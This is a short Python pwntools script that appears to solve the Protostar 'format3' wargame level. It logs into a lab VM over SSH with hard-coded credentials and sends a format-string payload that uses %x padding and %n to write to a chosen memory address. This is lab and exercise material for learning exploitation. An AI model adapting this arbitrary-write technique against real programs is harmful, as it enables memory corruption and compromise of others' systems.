#!/usr/bin/python3
from pwn import *
# you may need to change port for your machine
session = ssh(host='172.16.17.27', user='user', password='user', port=22)
# the variable target is at memory location:
target = 0x080496f4
# we use %x to get more digits and the number of total digits and characters
# is what is put in the memory address using %n
io = session.run('bash', env={"PS1":""})
if(io):
    io.sendline('python -c \"print \'\\xf4\\x96\\x04\\x08\'+\'%1539101x\'*11+\' %n\'\" | /opt/protostar/bin/format3 | tail -n 1')
    log.info(io.recvline(timeout=2).decode('utf-8'))
else:
    print("Error running sh")
session.close()
